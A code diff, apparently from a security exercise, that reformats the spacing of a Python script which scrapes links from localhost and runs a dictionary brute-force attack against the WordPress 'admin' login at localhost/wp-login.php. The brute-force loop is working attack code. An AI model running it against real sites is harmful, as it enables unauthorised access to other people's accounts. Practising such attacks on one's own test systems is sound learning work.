@@ -35,7 +35,7 @@ print(urls)
 
 # Scrape all URLs from the home page of localhost and print unique URLs
 resp = requests.get("http://localhost")
-soup = BeautifulSoup(resp.content,"html.parser")
+soup = BeautifulSoup(resp.content, "html.parser")
 anchor_list = [a['href'] for a in soup.find_all('a', href=True) if a.text.strip()]
 
 anchor_set = set(anchor_list)
@@ -49,16 +49,16 @@ soup = BeautifulSoup(resp.text, 'html.parser')
 print(soup.prettify())
 
 # Bruteforce the wordpress login for user "admin". Use the given dictionary.
-password_dict="password_dictionary.txt"
+password_dict = "password_dictionary.txt"
 
 # Loading the password dictionary and Striping \n
 lines = [line.rstrip('\n') for line in open(password_dict)]
 
 for password in lines:
-    print("Trying with password: ",password)
-    resp = requests.post('http://localhost/wp-login.php', data = {'log':'admin', 'pwd': password })
+    print("Trying with password: ", password)
+    resp = requests.post('http://localhost/wp-login.php', data={'log': 'admin', 'pwd': password})
     if "ERROR" not in resp.text:
-        print("Login successful with password: ",password)
+        print("Login successful with password: ", password)
         break
 
 print(resp.text)
